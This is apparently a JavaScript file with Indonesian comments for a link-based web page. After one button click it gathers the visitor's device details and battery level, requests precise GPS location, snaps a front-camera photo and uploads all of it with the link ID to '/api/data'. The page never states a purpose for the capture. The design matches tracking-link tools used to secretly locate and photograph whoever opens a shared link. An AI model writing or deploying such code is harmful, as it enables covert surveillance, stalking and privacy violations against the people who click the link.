const startButton = document.getElementById('startButton');
const statusDiv = document.getElementById('status');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

// Ambil link_id dari URL
const urlParams = new URLSearchParams(window.location.search);
const linkId = urlParams.get('id');

if (!linkId) {
    statusDiv.textContent = "Error: Link ID tidak ditemukan di URL.";
    startButton.disabled = true;
}

startButton.addEventListener('click', async () => {
    startButton.disabled = true;
    statusDiv.textContent = "Meminta izin...";

    try {
        const collectedData = {};

        // 1. Dapatkan Info Perangkat & Baterai
        statusDiv.textContent = "Mengambil info perangkat...";
        collectedData.deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
        };
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            collectedData.battery = {
                level: Math.round(battery.level * 100) + "%",
                isCharging: battery.charging
            };
        }

        // 2. Dapatkan Lokasi
        statusDiv.textContent = "Meminta izin lokasi...";
        const location = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true
            });
        });
        collectedData.location = {
            lat: location.coords.latitude,
            lon: location.coords.longitude,
            accuracy: location.coords.accuracy,
        };

        // 3. Dapatkan Foto dari Kamera Depan
        statusDiv.textContent = "Meminta izin kamera...";
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' } // 'user' untuk kamera depan
        });
        video.srcObject = stream;
        await new Promise(resolve => video.onloadedmetadata = resolve); // Tunggu video siap
        video.play();
        
        // Tunggu sebentar agar kamera bisa fokus
        await new Promise(resolve => setTimeout(resolve, 500)); 

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        collectedData.photoBase64 = canvas.toDataURL('image/jpeg', 0.7); // Kualitas 70%
        
        // Matikan stream kamera setelah selesai
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;

        // 4. Kirim semua data ke server
        statusDiv.textContent = "Mengirim data ke server...";
        await sendDataToServer(collectedData);

        statusDiv.textContent = "Data berhasil dikirim. Terima kasih! Anda bisa menutup halaman ini.";

    } catch (error) {
        console.error("Proses gagal:", error);
        let message = "Terjadi kesalahan.";
        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
            message = "Anda menolak permintaan izin. Proses dibatalkan.";
        } else if (error.name === 'NotFoundError') {
            message = "Kamera atau perangkat lokasi tidak ditemukan.";
        }
        statusDiv.textContent = `Error: ${message}`;
        startButton.disabled = false; // Izinkan coba lagi
    }
});

async function sendDataToServer(data) {
    const response = await fetch('/api/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ link_id: linkId, data: data })
    });

    if (!response.ok) {
        throw new Error('Gagal mengirim data ke server.');
    }
    return response.json();
}